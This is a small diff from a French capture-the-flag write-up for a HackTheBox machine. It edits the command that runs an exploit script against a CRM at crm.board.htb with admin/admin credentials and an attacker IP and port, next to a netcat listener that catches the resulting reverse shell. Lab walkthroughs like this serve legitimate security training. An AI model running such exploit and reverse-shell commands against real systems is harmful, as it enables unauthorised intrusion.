@@ -490,7 +490,7 @@ nc -lvnp 9001
 
 Puis, on lance le script:
 ```bash
-python3 exploit.py http://crm.board.htb/ admin admin 10.10.14.252 9001
+python3 exploit.py http://crm.board.htb admin admin 10.10.14.252 9001
 ```
 
 Une connexion est établie avec netcat:
